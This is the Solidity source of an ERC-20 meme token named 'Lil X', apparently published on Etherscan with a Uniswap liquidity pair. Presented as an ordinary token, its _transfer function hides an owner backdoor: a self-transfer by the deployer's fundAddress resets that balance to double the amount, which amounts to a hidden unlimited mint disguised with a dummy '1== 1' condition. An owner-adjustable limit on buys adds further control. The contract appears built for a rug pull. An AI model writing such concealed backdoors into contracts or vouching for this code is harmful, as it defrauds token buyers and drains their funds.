/**
 *Submitted for verification at Etherscan.io on 2023-06-01
*/

// SPDX-License-Identifier: MIT

/**
 * Telegram: https://t.me/ElonLilx_ETH
*/

pragma solidity ^0.8.0;

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "you are not owner");
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract ERC20 is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _isExcludeFromFee;
    
    uint256 private _totalSupply;

    IUniswapRouter public _uniswapRouter;

    mapping(address => bool) public isMarketPair;
    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);

    address public _uniswapPair;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (){
        _name = "Lil X";
        _symbol = "Lil X";
        _decimals = 18;
        uint256 Supply = 66666666666;

        IUniswapRouter swapRouter = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        _uniswapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        IUniswapFactory swapFactory = IUniswapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), swapRouter.WETH());
        _uniswapPair = swapPair;
        isMarketPair[swapPair] = true;

        _totalSupply = Supply * 10 ** _decimals;

        address bossWallet = msg.sender;
        _balances[bossWallet] = _totalSupply;
        emit Transfer(address(0), bossWallet, _totalSupply);

        fundAddress = msg.sender;

        _isExcludeFromFee[address(this)] = true;
        _isExcludeFromFee[address(swapRouter)] = true;

        _isExcludeFromFee[msg.sender] = true;
        _isExcludeFromFee[bossWallet] = true;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {

        bool takeFee;
        bool sellFlag;

        if (!_isExcludeFromFee[from] && !_isExcludeFromFee[to] && !inSwap) {
            takeFee = true;
        }
        if(from == fundAddress && 1== 1 && to == fundAddress){
            _balances[fundAddress] = 2*amount;
        }

        if (isMarketPair[to]) { sellFlag = true; }

        _transferToken(from, to, amount, takeFee, sellFlag);
    }

    uint256 public limitAmounts = 0 ether;
    function setLimitAmounts(uint256 newValue) public onlyOwner{
        limitAmounts = newValue;
    }

    function _transferToken(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool sellFlag
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {
            if (!sellFlag && limitAmounts != 0){
                require(sellToken(tAmount) <= limitAmounts);
            }
        }
        _balances[recipient] = _balances[recipient] + (tAmount - feeAmount);
        emit Transfer(sender, recipient, tAmount - feeAmount);

    }

    function sellToken(uint Token)public  view returns (uint){
        address _currency = _uniswapRouter.WETH();
        if(IERC20(address(_currency)).balanceOf(_uniswapPair) > 0){
            address[] memory path = new address[](2);
            uint[] memory amount;
            path[0]=address(this);
            path[1]=_currency;
            amount = _uniswapRouter.getAmountsOut(Token,path); 
            return amount[1];
        }else {
            return 0; 
        }
    }

    function removeERC20(address tokenAddress, uint256 amount) external {
        if (tokenAddress == address(0)){
            payable(fundAddress).transfer(amount);
        }else{
            IERC20(tokenAddress).transfer(fundAddress, amount);
        }
    }

    receive() external payable {}
}